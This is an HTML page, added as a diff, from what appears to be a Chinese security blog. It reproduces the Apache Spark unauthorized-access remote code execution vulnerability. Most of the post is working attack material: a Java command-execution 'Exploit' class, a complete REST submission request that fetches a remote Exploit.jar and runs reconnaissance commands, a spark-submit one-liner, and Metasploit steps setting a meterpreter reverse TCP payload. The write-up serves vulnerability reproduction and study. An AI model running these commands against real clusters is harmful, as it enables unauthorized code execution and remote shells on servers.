@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Apache Spark 未授权访问漏洞一、漏洞简介ApacheSpark是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。如果管理节点未启动ACL（访问控制），我们将可以在集群中执行任意代码。 二、漏洞影响三、复现过程方法一该漏洞本质是未授权的用户可以向管理节点提交一个应用，这个应用实际上是恶意代码。 提交方式有两种：    利用REST API   利用submissions">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Apache%20Spark/Apache%20Spark%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="Apache Spark 未授权访问漏洞一、漏洞简介ApacheSpark是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。如果管理节点未启动ACL（访问控制），我们将可以在集群中执行任意代码。 二、漏洞影响三、复现过程方法一该漏洞本质是未授权的用户可以向管理节点提交一个应用，这个应用实际上是恶意代码。 提交方式有两种：    利用REST API   利用submissions">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/ApacheSpark%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/media/rId26.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/ApacheSpark%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/media/rId27.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/ApacheSpark%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/media/rId30.png">
+<meta property="article:published_time" content="2022-07-08T06:25:52.940Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.675Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/ApacheSpark%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/media/rId26.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-Apache Spark/Apache Spark 未授权访问漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/Apache%20Spark/Apache%20Spark%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:52.940Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Apache-Spark-未授权访问漏洞"><a href="#Apache-Spark-未授权访问漏洞" class="headerlink" title="Apache Spark 未授权访问漏洞"></a>Apache Spark 未授权访问漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Apache<br>Spark是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。如果管理节点未启动ACL（访问控制），我们将可以在集群中执行任意代码。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>该漏洞本质是未授权的用户可以向管理节点提交一个应用，这个应用实际上是恶意代码。</p>
+<p>提交方式有两种：</p>
+<ul>
+<li>  利用REST API</li>
+<li>  利用submissions网关（集成在7077端口中）</li>
+</ul>
+<p>应用可以是Java或Python，就是一个最简单的类，</p>
+<pre><code>import java.io.BufferedReader;
+import java.io.InputStreamReader;
+
+public class Exploit &#123;
+  public static void main(String[] args) throws Exception &#123;
+    String[] cmds = args[0].split(&quot;,&quot;);
+
+    for (String cmd : cmds) &#123;
+      System.out.println(cmd);
+      System.out.println(executeCommand(cmd.trim()));
+      System.out.println(&quot;==============================================&quot;);
+    &#125;
+  &#125;
+
+  // https://www.mkyong.com/java/how-to-execute-shell-command-from-java/
+  private static String executeCommand(String command) &#123;
+    StringBuilder output = new StringBuilder();
+
+    try &#123;
+      Process p = Runtime.getRuntime().exec(command);
+      p.waitFor();
+      BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+
+      String line;
+      while ((line = reader.readLine()) != null) &#123;
+        output.append(line).append(&quot;\n&quot;);
+      &#125;
+    &#125; catch (Exception e) &#123;
+      e.printStackTrace();
+    &#125;
+
+    return output.toString();
+  &#125;
+&#125;
+</code></pre>
+<p>将其编译成JAR，放在任意一个HTTP或FTP上，如</p>
+<p><code>https://download.0-sec.org/Web安全/Apache Spark/Apache Spark 未授权访问漏洞.jar</code>。</p>
+<h4 id="用REST-API方式提交应用"><a href="#用REST-API方式提交应用" class="headerlink" title="用REST API方式提交应用"></a>用REST API方式提交应用</h4><p>standalone模式下，master将在6066端口启动一个HTTP服务器，我们向这个端口提交REST格式的API：</p>
+<pre><code>POST /v1/submissions/create HTTP/1.1
+Host: www.0-sec.org:6066
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Content-Type: application/json
+Connection: close
+Content-Length: 680
+
+&#123;
+  &quot;action&quot;: &quot;CreateSubmissionRequest&quot;,
+  &quot;clientSparkVersion&quot;: &quot;2.3.1&quot;,
+  &quot;appArgs&quot;: [
+    &quot;whoami,w,cat /proc/version,ifconfig,route,df -h,free -m,netstat -nltp,ps auxf&quot;
+  ],
+  &quot;appResource&quot;: &quot;https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar&quot;,
+  &quot;environmentVariables&quot;: &#123;
+    &quot;SPARK_ENV_LOADED&quot;: &quot;1&quot;
+  &#125;,
+  &quot;mainClass&quot;: &quot;Exploit&quot;,
+  &quot;sparkProperties&quot;: &#123;
+    &quot;spark.jars&quot;: &quot;https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar&quot;,
+    &quot;spark.driver.supervise&quot;: &quot;false&quot;,
+    &quot;spark.app.name&quot;: &quot;Exploit&quot;,
+    &quot;spark.eventLog.enabled&quot;: &quot;true&quot;,
+    &quot;spark.submit.deployMode&quot;: &quot;cluster&quot;,
+    &quot;spark.master&quot;: &quot;spark://your-ip:6066&quot;
+  &#125;
+&#125;
+</code></pre>
+<p>其中，<code>spark.jars</code>即是编译好的应用，mainClass是待运行的类，appArgs是传给应用的参数。</p>
+<p><img src="/resource/ApacheSpark%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/media/rId26.png" alt="1.png"></p>
+<p>返回的包中有submissionId，然后访问<code>http://www.0-sec.org:8081/logPage/?driverId=&#123;submissionId&#125;&amp;logType=stdout</code>，即可查看执行结果：</p>
+<p><img src="/resource/ApacheSpark%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/media/rId27.png" alt="2.png"></p>
+<p>注意，提交应用是在master中，查看结果是在具体执行这个应用的slave里（默认8081端口）。实战中，由于slave可能有多个。</p>
+<h4 id="利用submissions网关"><a href="#利用submissions网关" class="headerlink" title="利用submissions网关"></a>利用submissions网关</h4><p>如果6066端口不能访问，或做了权限控制，我们可以利用master的主端口7077，来提交应用。</p>
+<p>方法是利用Apache Spark自带的脚本<code>bin/spark-submit</code>：</p>
+<pre><code>bin/spark-submit --master spark://www.0-sec.org:7077 --deploy-mode cluster --class Exploit https://github.com/aRe00t/rce-over-spark/raw/master/Exploit.jar id
+</code></pre>
+<p>如果你指定的master参数是rest服务器，这个脚本会先尝试使用rest<br>api来提交应用；如果发现不是rest服务器，则会降级到使用submission<br>gateway来提交应用。</p>
+<p>查看结果的方式与前面一致。</p>
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><pre><code>msf5&gt; use exploit/linux/http/spark_unauth_rce
+msf5&gt; set payload java/meterpreter/reverse_tcp
+msf5&gt; set rhost 被攻击ip
+msf5&gt; set rport 6066
+msf5&gt; set lhost 攻击ip
+msf5&gt; set lport 4444
+msf5&gt; set srvhost 1攻击ip
+msf5&gt; set srvport 8080
+msf5&gt; exploit
+</code></pre>
+<p><img src="/resource/ApacheSpark%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/media/rId30.png" alt="1.png"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://vulhub.org//#/environments/spark/unacc/">https://vulhub.org/\#/environments/spark/unacc/</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Apache%20Spark/Apache%20Spark%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qml20023y8v132qcehn9" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Apache%20SSI/Apache%20SSI%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/Apache%20Solr/%EF%BC%88CVE-2019-17558%EF%BC%89Apache%20Solr%20%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
